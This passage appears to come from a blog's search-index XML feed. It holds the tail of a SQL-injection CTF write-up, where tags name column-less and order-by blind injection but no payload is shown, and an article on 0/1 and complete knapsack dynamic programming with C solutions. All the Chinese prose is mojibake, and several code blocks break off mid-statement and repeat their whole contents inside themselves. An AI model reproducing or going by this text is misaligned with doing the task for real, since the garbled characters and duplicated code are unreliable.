class="hljs-keyword">next</span><br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/5.jpg" alt=""><br>åŒæ ·èƒ½å¤Ÿè¯»å–flag</p><p>é¢„ç¼–è¯‘è¯­å¥è¯´å®Œäº†ï¼Œå†çœ‹åˆ°æ— åˆ—åæ³¨å…¥</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> SQLæ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQLé¢„å¤„ç† </tag>
            
            <tag> æ— åˆ—åæ³¨å…¥ </tag>
            
            <tag> order byç›²æ³¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŠ¨æ€è§„åˆ’çš„èƒŒåŒ…é—®é¢˜</title>
      <link href="/LawlietLW.github.io/2020/02/10/dong-tai-gui-hua/"/>
      <url>/LawlietLW.github.io/2020/02/10/dong-tai-gui-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="01èƒŒåŒ…å’Œå®Œå…¨èƒŒåŒ…"><a href="#01èƒŒåŒ…å’Œå®Œå…¨èƒŒåŒ…" class="headerlink" title="01èƒŒåŒ…å’Œå®Œå…¨èƒŒåŒ…"></a>01èƒŒåŒ…å’Œå®Œå…¨èƒŒåŒ…</h2><p>è®°å½•ä¸€ä¸‹è¿™ä¸¤å¤©å­¦ä¹ çš„åŠ¨æ€è§„åˆ’ç®—æ³•ï¼Œæ‹–äº†å¥½ä¹…äº†<br>åŠ¨æ€è§„åˆ’å¯ä»¥è¯´æ˜¯é€’å½’çš„å‡çº§ç‰ˆï¼Œç”šè‡³å¯ä»¥æ›¿ä»£BFSå’ŒDFSï¼Œèƒ½ç†Ÿç»ƒæŒæ¡çš„è¯å°±ä¸ç”¨å†å°±çº ç»“ç”¨ä»€ä¹ˆæœç´¢ç®—æ³•å¥½äº†<br>è¿™ä¸¤å¤©åœ¨æ´›è°·ä¸Šåˆ·äº†ä¸€ä¸‹åŠ¨æ€è§„åˆ’åœ°èƒŒåŒ…ç®—æ³•éƒ¨åˆ†ï¼Œæ·±æ„ŸDPçš„ä¾¿åˆ©ï¼Œç”¨è´ªå¿ƒç®—æ³•çš„è¯è¦å†™ä¸€å¤§ç¯‡ä»£ç <br>è¿›å…¥æ­£é¢˜<br>èƒŒåŒ…ç®—æ³•å¯åˆ†ä¸º01èƒŒåŒ…ï¼Œå®Œå…¨èƒŒåŒ…å’Œå¤šé‡èƒŒåŒ…ï¼Œåœ¨è¿™é‡Œä¸»è¦è®°å½•å‰ä¸¤ç§ï¼Œå…ˆè´´å‡ºä¸¤ç§èƒŒåŒ…ç®—æ³•çš„æ ¸å¿ƒä»£ç <br>å®Œå…¨èƒŒåŒ…ä»£ç æ®µï¼š</p><figure class="hljs highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=w[i];j&lt;=V;j++)<br>        f[j]=<span class="hljs-built_in"><code class="language-hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=w[i];j&lt;=V;j++)<br>        f[j]=<span class="hljs-built_in">max</span>(f[j],f[j-w[i]]+c[i]);<br></code></pre></td></tr></tbody></table></figure><p>è¿™æ˜¯01èƒŒåŒ…çš„æ ¸å¿ƒä»£ç æ®µï¼š</p><figure class="hljs highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++){<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=m;j&gt;=s[i];j--){<br>        f[j]=<span class="hljs-built_in"><code class="language-hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++){<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=m;j&gt;=s[i];j--){<br>        f[j]=<span class="hljs-built_in">max</span>(f[j],f[j-s[i]]+v[i]);}}<br></code></pre></td></tr></tbody></table></figure><p>å¯ä»¥çœ‹å‡ºï¼Œå®Œå…¨èƒŒåŒ…å’Œ01èƒŒåŒ…çš„å·®åˆ«ä»…ä»…åœ¨äºç¬¬äºŒæ¬¡éå†çš„æ–¹å‘ï¼Œå‰è€…æ˜¯æ­£å‘éå†ï¼Œè€Œåè€…æ˜¯é€†å‘éå†</p><h2 id="01èƒŒåŒ…"><a href="#01èƒŒåŒ…" class="headerlink" title="01èƒŒåŒ…"></a>01èƒŒåŒ…</h2><p>å…ˆè®²è§£01èƒŒåŒ…</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">é—®é¢˜æè¿°:<br>01èƒŒåŒ…æ˜¯åœ¨Nä»¶ç‰©å“å–å‡ºè‹¥å¹²ä»¶æ”¾åœ¨ç©ºé—´ä¸ºCçš„èƒŒåŒ…é‡Œï¼Œæ¯ä»¶ç‰©å“çš„ä½“ç§¯ä¸ºW1ï¼ŒW2è‡³Wnï¼Œä¸ä¹‹ç›¸å¯¹åº”çš„ä»·å€¼ä¸ºV1,V2è‡³Vnã€‚01èƒŒåŒ…æ˜¯èƒŒåŒ…é—®é¢˜ä¸­æœ€ç®€å•çš„é—®é¢˜ã€‚01èƒŒåŒ…çš„çº¦æŸæ¡ä»¶æ˜¯ç»™å®šå‡ ç§ç‰©å“ï¼Œæ¯ç§ç‰©å“æœ‰ä¸”åªæœ‰ä¸€ä¸ªï¼Œå¹¶ä¸”æœ‰æƒå€¼å’Œä½“ç§¯ä¸¤ä¸ªå±æ€§<br></code></pre></td></tr></tbody></table></figure><h3 id="DPä¸‰æ­¥è§£é¢˜æ€è·¯"><a href="#DPä¸‰æ­¥è§£é¢˜æ€è·¯" class="headerlink" title="DPä¸‰æ­¥è§£é¢˜æ€è·¯"></a>DPä¸‰æ­¥è§£é¢˜æ€è·¯</h3><p>è§£é¢˜æ€è·¯:<br>ä¸€èˆ¬è€Œè¨€ï¼ŒDPé¢˜éƒ½æœ‰ä¸‰ä¸ªæ­¥éª¤:</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">1.ç¡®å®šdpæ•°ç»„çš„å«ä¹‰ï¼Œå³dp[i]æ‰€ä»£è¡¨çš„æ„ä¹‰<br>2.ç¡®å®šdpé€’æ¨è¡¨è¾¾å¼ï¼Œå³dp[i]ç”±ä»€ä¹ˆå¯ä»¥æ¨å¯¼è€Œæ¥<br>3.ç¡®å®šdpæ•°ç»„åˆå€¼ï¼Œå’Œé€’å½’ä¸€æ ·ï¼ŒdpåŒæ ·ä¹Ÿéœ€è¦åˆå€¼ï¼Œå¦åˆ™å°±ä¼šé™·å…¥æ­»å¾ªç¯<br></code></pre></td></tr></tbody></table></figure><p>å†æ¥çœ‹01èƒŒåŒ…é—®é¢˜<br>æ¯ç§ç‰©å“åªæœ‰ä¸€ä¸ªï¼Œå¯¹äºä»»ä½•ä¸€ä¸ªç‰©å“ï¼Œæˆ‘ä»¬çš„é€‰æ‹©åªæœ‰ä¸¤ç§:è£…å…¥èƒŒåŒ…æˆ–è€…ä¸è£…å¦‚èƒŒåŒ…</p><h3 id="ä¾‹é¢˜1"><a href="#ä¾‹é¢˜1" class="headerlink" title="ä¾‹é¢˜1"></a>ä¾‹é¢˜1</h3><p>è¿™é‡Œæˆ‘ä»¬ä»¥æ´›è°·åŠ¨æ€è§„åˆ’çš„èƒŒåŒ…éƒ¨åˆ†ç¬¬ä¸€é¢˜ä¸ºä¾‹</p><figure class="hljs highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs plain"><code class="language-hljs plain">P1060 å¼€å¿ƒçš„é‡‘æ˜<br>é‡‘æ˜ä»Šå¤©å¾ˆå¼€å¿ƒï¼Œå®¶é‡Œè´­ç½®çš„æ–°æˆ¿å°±è¦é¢†é’¥åŒ™äº†ï¼Œæ–°æˆ¿é‡Œæœ‰ä¸€é—´ä»–è‡ªå·±ä¸“ç”¨çš„å¾ˆå®½æ•çš„æˆ¿é—´ã€‚æ›´è®©ä»–é«˜å…´çš„æ˜¯ï¼Œå¦ˆå¦ˆæ˜¨å¤©å¯¹ä»–è¯´ï¼šâ€œä½ çš„æˆ¿é—´éœ€è¦è´­ä¹°å“ªäº›ç‰©å“ï¼Œæ€ä¹ˆå¸ƒç½®ï¼Œä½ è¯´äº†ç®—ï¼Œåªè¦ä¸è¶…è¿‡NNå…ƒé’±å°±è¡Œâ€ã€‚ä»Šå¤©ä¸€æ—©é‡‘æ˜å°±å¼€å§‹åšé¢„ç®—ï¼Œä½†æ˜¯ä»–æƒ³ä¹°çš„ä¸œè¥¿å¤ªå¤šäº†ï¼Œè‚¯å®šä¼šè¶…è¿‡å¦ˆå¦ˆé™å®šçš„NNå…ƒã€‚äºæ˜¯ï¼Œä»–æŠŠæ¯ä»¶ç‰©å“è§„å®šäº†ä¸€ä¸ªé‡è¦åº¦ï¼Œåˆ†ä¸º55ç­‰ï¼šç”¨æ•´æ•°1-51âˆ’5è¡¨ç¤ºï¼Œç¬¬55ç­‰æœ€é‡è¦ã€‚ä»–è¿˜ä»å› ç‰¹ç½‘ä¸ŠæŸ¥åˆ°äº†æ¯ä»¶ç‰©å“çš„ä»·æ ¼ï¼ˆéƒ½æ˜¯æ•´æ•°å…ƒï¼‰ã€‚ä»–å¸Œæœ›åœ¨ä¸è¶…è¿‡NNå…ƒï¼ˆå¯ä»¥ç­‰äºNNå…ƒï¼‰çš„å‰æä¸‹ï¼Œä½¿æ¯ä»¶ç‰©å“çš„ä»·æ ¼ä¸é‡è¦åº¦çš„ä¹˜ç§¯çš„æ€»å’Œæœ€å¤§ã€‚<br>è®¾ç¬¬jä»¶ç‰©å“çš„ä»·æ ¼ä¸ºv[j],é‡è¦åº¦ä¸ºw[j]å…±é€‰ä¸­äº†kä»¶ç‰©å“ç¼–å·ä¾æ¬¡ä¸ºj1,j2,â€¦,jk,åˆ™æ‰€æ±‚çš„æ€»å’Œä¸ºï¼š<br>v[j1]*w[j1]+v[j2]*w[j2]+...+v[jk]*w[jk]<br>è¯·ä½ å¸®åŠ©é‡‘æ˜è®¾è®¡ä¸€ä¸ªæ»¡è¶³è¦æ±‚çš„è´­ç‰©å•ã€‚<br></code></pre></td></tr></tbody></table></figure><p>å…¸å‹çš„01èƒŒåŒ…é¢˜<br><code>åœ¨æœ‰é™çš„èƒŒåŒ…å®¹é‡ä¸‹ï¼Œæ€æ ·è£…å…¥ç‰©å“èƒ½ä½¿è£…å…¥çš„ç‰©å“çš„æƒé‡æœ€å¤§</code><br>é¦–å…ˆç¡®å®šæˆ‘ä»¬çš„dpæ•°ç»„è¡¨è¾¾å¼ï¼Œdp[i]ä»£è¡¨ç€ä»€ä¹ˆ<br>æ ¹æ®é¢˜æ„ï¼Œæˆ‘ä»¬è¦æ±‚çš„æ˜¯å¦‚ä½•ä½¿åœ¨ä¸è¶…è¿‡èƒŒåŒ…å®¹é‡çš„æƒ…å†µä¸‹ä½¿è£…å…¥èƒŒåŒ…ç‰©å“çš„æƒé‡æœ€å¤§<br>é‚£æˆ‘ä»¬å°±é¡ºç€é¢˜æ„å‡è®¾:dp[i]ä¸ºå½“èƒŒåŒ…å®¹é‡ä¸ºiæ—¶ï¼Œä¸è£…å…¥ç¬¬jä»¶ç‰©å“æ—¶çš„æœ€å¤§æƒé‡<br>åœ¨è¿™é“é¢˜é‡Œå°±æ˜¯:dp[i]ä¸ºå½“æˆ‘ä»¬çš„é’±ä¸ºiæ—¶ï¼Œä¸ä¹°ç¬¬jä»¶ç‰©å“æ—¶çš„æœ€å¤§æƒé‡</p><p>ç¬¬äºŒæ­¥ï¼Œç¡®å®šé€’æ¨è¡¨è¾¾å¼dp[i]å¯ä»¥ä»ä»€ä¹ˆæ¨å¯¼è€Œæ¥<br>æˆ‘ä»¬æƒ³ï¼Œç¬¬jä»¶ç‰©å“å¯ä»¥è£…å…¥å¯ä»¥ä¸è£…å…¥ï¼Œè€Œå¯ä»¥é€‰æ‹©è£…å…¥æˆ–è€…ä¸è£…å…¥çš„å‰ææ˜¯ï¼Œæˆ‘ä»¬èƒŒåŒ…çš„å‰©ä½™å®¹é‡è¦å¤§äºç­‰äºè¿™ä»¶ç‰©å“æ‰€å çš„ä½“ç§¯,åœ¨è¿™é“é¢˜é‡Œå°±æ˜¯æˆ‘ä»¬å‰©ä½™çš„é’±è¦å¤§äºç­‰äºç¬¬jä¸ªç‰©å“çš„ä»·æ ¼ï¼Œå³i&gt;=v[j]<br>é‚£ä¹ˆï¼Œå½“ä¸è£…å…¥è¿™ä»¶ç‰©å“æ—¶ï¼Œdp[i]ä¸å˜(ä¸è¦å¿˜äº†æˆ‘ä»¬å¯¹æ•°ç»„çš„å®šä¹‰),å½“è£…å…¥æ—¶ï¼Œ<code>dp[i]=dp[i-v[i]]+v[j]*w[i]</code>,å› ä¸ºæˆ‘ä»¬è£…å…¥äº†ç¬¬jä»¶ç‰©å“ï¼Œç›¸åº”çš„æˆ‘ä»¬å‰©ä¸‹çš„é’±å°±æ˜¯å½“å‰çš„é’±i-v[j],æˆ‘ä»¬çš„æƒé‡å°±ç›¸åº”çš„å¢åŠ v[j]*w[j]<br>è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬è¦æ±‚çš„dp[i]å°±æ˜¯åœ¨ä¹°å’Œä¸ä¹°ä¸¤è€…é—´é€‰æ‹©è¾ƒå¤§çš„é‚£ä¸€æ–¹<br>é€’æ¨å…¬å¼å°±ä¸º</p><figure class="hljs highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs c">dp[i]=<span class="hljs-built_in"><code class="language-hljs c">dp[i]=<span class="hljs-built_in">max</span>(dp[i],dp[i-v[j]]+v[j]*w[j])<br></code></pre></td></tr></tbody></table></figure><p>ç¬¬ä¸‰æ­¥ï¼Œæ±‚åˆå€¼<br>äº‹å®ä¸Šï¼Œè¿™ç§èƒŒåŒ…é—®é¢˜å¹¶ä¸éœ€è¦æˆ‘ä»¬ç‰¹æ„æ±‚åˆå€¼ï¼Œå› ä¸ºæˆ‘ä»¬é€’æ¨å…¬å¼çš„æˆç«‹æ˜¯æœ‰æ¡ä»¶çš„ï¼Œç›¸å½“äºå·²ç»è®¾å®šäº†ä¸€ä¸ªåˆå§‹å€¼ã€‚</p><p>ä¸‰éƒ¨åˆ†éƒ½å·²ç»ç¡®å®šå¥½äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç”¨ä»£ç è¡¨è¾¾å‡ºæ¥äº†</p><figure class="hljs highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre class=" language-hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"stdio.h"</span></span><br><span class="hljs-keyword">int</span> v[<span class="hljs-number">30</span>],p[<span class="hljs-number">30</span>],w[<span class="hljs-number">30</span>],dp[<span class="hljs-number">50000</span>];<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">max</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x,<span class="hljs-keyword">int</span> y)</span><br></span>{<br>    <span class="hljs-keyword">return</span> x&gt;y?x:y;<br>}<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span><br></span>{<br>    <span class="hljs-keyword">int</span> n,m;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d"</span>,&amp;n,&amp;m);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)<br>    {<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d"</span>,&amp;v[i],&amp;p[i]);<br>        w[i]=v[i]*p[i];<br>    }<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)<br>    {<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=n;j&gt;=v[i];j--)<br>        {<br>            dp[j]=<span class="hljs-built_in">max</span>(dp[j],dp[j-v[i]]+w[i]);<br>        }<br>    }<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>,dp[n]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number"><code class="language-hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"stdio.h"</span></span><br><span class="hljs-keyword">int</span> v[<span class="hljs-number">30</span>],p[<span class="hljs-number">30</span>],w[<span class="hljs-number">30</span>],dp[<span class="hljs-number">50000</span>];<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">max</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x,<span class="hljs-keyword">int</span> y)</span><br></span>{<br>    <span class="hljs-keyword">return</span> x&gt;y?x:y;<br>}<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span><br></span>{<br>    <span class="hljs-keyword">int</span> n,m;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d"</span>,&amp;n,&amp;m);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)<br>    {<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d"</span>,&amp;v[i],&amp;p[i]);<br>        w[i]=v[i]*p[i];<br>    }<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)<br>    {<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=n;j&gt;=v[i];j--)<br>        {<br>            dp[j]=<span class="hljs-built_in">max</span>(dp[j],dp[j-v[i]]+w[i]);<br>        }<br>    }<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>,dp[n]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>ä»£ç å¾ˆç®€å•ï¼Œæ ¸å¿ƒä»£ç åªæœ‰çŸ­çŸ­å‡ è¡Œè€Œå·²ï¼Œæ¢åšæ˜¯ç”¨è´ªå¿ƒæ¥æ±‚çš„è¯å¯å°±éº»çƒ¦å¤šäº†</p><h3 id="ä¾‹é¢˜2"><a href="#ä¾‹é¢˜2" class="headerlink" title="ä¾‹é¢˜2"></a>ä¾‹é¢˜2</h3><p>å†æ¥ä¸€é¢˜<br><img src="/LawlietLW.github.io/2020/02/10/dong-tai-gui-hua/1.jpg" alt=""><br>è¿˜æ˜¯å…ˆç¡®å®šdpæ•°ç»„çš„å«ä¹‰<br>æˆ‘ä»¬è¦æ±‚çš„æ˜¯ï¼ŒæŠŠé’±èŠ±å…‰æœ‰å¤šå°‘ç§æ–¹æ³•ï¼Œä¾ç„¶æ˜¯æ¯ç§èœåªèƒ½ä¸Šä¸€æ¬¡,æ²¡æœ‰è·³å‡º01èƒŒåŒ…çš„èŒƒå›´<br>è¿™æ¬¡æˆ‘ä»¬ç”¨äºŒç»´æ•°ç»„ï¼Œdp[i][j]ï¼Œdp[i][j]è¡¨ç¤º:å‰iç§èœä¸”æœªä¸Šç¬¬iç›˜èœæ—¶ï¼Œä½™é¢ä¸ºjçš„æƒ…å†µä¸‹çš„ç‚¹èœæ–¹æ³•æ•°<br>å¯èƒ½æœ‰ç‚¹ç»•ï¼Œä¸è¿‡å¾€ä¸‹çœ‹å°±æ‡‚äº†</p><p>å†æ±‚é€’æ¨å…¬å¼<br>é¦–å…ˆï¼Œå’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œæˆ‘ä»¬èƒ½å¯¹ç¬¬iç§èœä½œå‡ºä¸Šæˆ–è€…ä¸ä¸Šé€‰æ‹©çš„å‰ææ˜¯æˆ‘ä»¬çš„ä½™é¢å¤§äºç­‰äºç¬¬iç§èœçš„ä»·æ ¼ï¼Œå³<code>j&gt;= a[i]</code>.å½“<code>j&lt;a[i]</code>æ—¶ï¼Œdp[i][j]å°±ç­‰äºå‰ä¸€ç§çŠ¶æ€çš„æ•°å€¼ï¼Œå³<code>dp[i][j]=dp[i-1][j]</code><br>å†æ¥çœ‹<code>j&gt;= a[i]</code>çš„æƒ…å†µï¼Œ&gt;=çš„æƒ…å†µå¯ä»¥åˆ†å¼€æ¥è°ˆï¼Œæˆ‘ä»¬å…ˆçœ‹=çš„æƒ…å†µ<br>åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬å†æ¬¡æ˜ç¡®ä¸€ä¸‹dpæ•°ç»„çš„å®šä¹‰ï¼Œ<code>dp[i][j]è¡¨ç¤º:å‰iç§èœä¸”æœªä¸Šç¬¬iç›˜èœæ—¶ï¼Œä½™é¢ä¸ºjçš„æƒ…å†µä¸‹çš„ç‚¹èœæ–¹æ³•æ•°</code>ï¼Œæ³¨æ„ï¼Œæ˜¯æ–¹æ³•æ•°<br>å½“æˆ‘ä»¬çš„ä½™é¢jç­‰äºç¬¬iç§èœçš„ä»·æ ¼a[i]æ—¶ï¼Œç›¸å¯¹äºä¸Šä¸€ä¸ªçŠ¶æ€æˆ‘ä»¬å°±å¤šäº†ä¸€ç§æ–¹æ³•ï¼Œå°±æ˜¯è¦ç¬¬iç§èœï¼Œè¦äº†ç¬¬iç§èœåæˆ‘ä»¬çš„ä½™é¢å°±å˜æˆäº†0ï¼Œå°±ä¹°ä¸äº†å…¶ä»–çš„èœäº†ï¼Œæ‰€ä»¥åœ¨<code>j=a[i]</code>è¿™ç§æƒ…å†µä¸‹ï¼Œé€’æ¨å…¬å¼å°±æ˜¯<code>dp[i][j]=d[i-1][j]+1</code><br>å†çœ‹j&gt;a[i]çš„æƒ…å†µï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬çš„ä½™é¢åœ¨ä¹°å®Œç¬¬iç§èœåè¿˜æœ‰å‰©ä½™ï¼Œå¯èƒ½å¯ä»¥ç»§ç»­ä¹°å‰©ä¸‹çš„èœï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ–¹æ³•æ•°å°±æ¼”å˜æˆäº†ä¸ä¹°è¿™ç›˜èœå’Œä¹°è¿™ç›˜èœçš„æ–¹æ³•æ€»å’Œï¼Œé€’æ¨å…¬å¼ä¸º<code>dp[i][j]=dp[i-1][j]+dp[i-1][j-a[i]]</code><br>è¿™æ ·ä¸€æ¥æˆ‘ä»¬çš„dpé€’æ¨å…¬å¼å°±æ±‚å®Œäº†</p><p>ç¬¬ä¸‰æ­¥ï¼Œæ±‚åˆå€¼<br>å’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼ŒåŒæ ·ä¸éœ€è¦æ±‚åˆå€¼ï¼Œiå’Œjçš„å–å€¼éƒ½æ˜¯æœ‰èŒƒå›´çš„</p><p>ä»£ç å¦‚ä¸‹</p><figure class="hljs highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre class=" language-hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"stdio.h"</span></span><br><span class="hljs-keyword">int</span> a[<span class="hljs-number">200</span>],dp[<span class="hljs-number">200</span>][<span class="hljs-number">10001</span>];<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> *argv[])</span><br></span>{<br>    <span class="hljs-keyword">int</span> n,m;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d"</span>,&amp;n,&amp;m);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    {<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>,&amp;a[i]);<br>    }<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    {<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)<br>        {<br>            <span class="hljs-keyword">if</span>(j==a[i])<br>                dp[i][j]=dp[i<span class="hljs-number">-1</span>][j]+<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(j&gt;a[i])<br>                dp[i][j]=dp[i<span class="hljs-number">-1</span>][j]+dp[i<span class="hljs-number">-1</span>][j-a[i]];<br>            <span class="hljs-keyword">if</span>(j&lt;a[i])<br>                dp[i][j]=dp[i<span class="hljs-number">-1</span>][j];<br>        }<br>    }<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>,dp[n][m]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number"><code class="language-hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"stdio.h"</span></span><br><span class="hljs-keyword">int</span> a[<span class="hljs-number">200</span>],dp[<span class="hljs-number">200</span>][<span class="hljs-number">10001</span>];<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> *argv[])</span><br></span>{<br>    <span class="hljs-keyword">int</span> n,m;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d"</span>,&amp;n,&amp;m);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    {<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>,&amp;a[i]);<br>    }<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    {<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)<br>        {<br>            <span class="hljs-keyword">if</span>(j==a[i])<br>                dp[i][j]=dp[i<span class="hljs-number">-1</span>][j]+<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(j&gt;a[i])<br>                dp[i][j]=dp[i<span class="hljs-number">-1</span>][j]+dp[i<span class="hljs-number">-1</span>][j-a[i]];<br>            <span class="hljs-keyword">if</span>(j&lt;a[i])<br>                dp[i][j]=dp[i<span class="hljs-number">-1</span>][j];<br>        }<br>    }<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>,dp[n][m]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>01èƒŒåŒ…å°±å…ˆè®°å½•è¿™ä¸¤é¢˜ï¼Œæœ‰æ—¶é—´å†è¡¥å……</p><h2 id="å®Œå…¨èƒŒåŒ…"><a href="#å®Œå…¨èƒŒåŒ…" class="headerlink" title="å®Œå…¨èƒŒåŒ…"></a>å®Œå…¨èƒŒåŒ…</h2><p>å†æ¥çœ‹å®Œå…¨èƒŒåŒ…é—®é¢˜<br>å®Œå…¨èƒŒåŒ…å’Œ01èƒŒåŒ…çš„åŸºæœ¬æ˜¯ä¸€æ 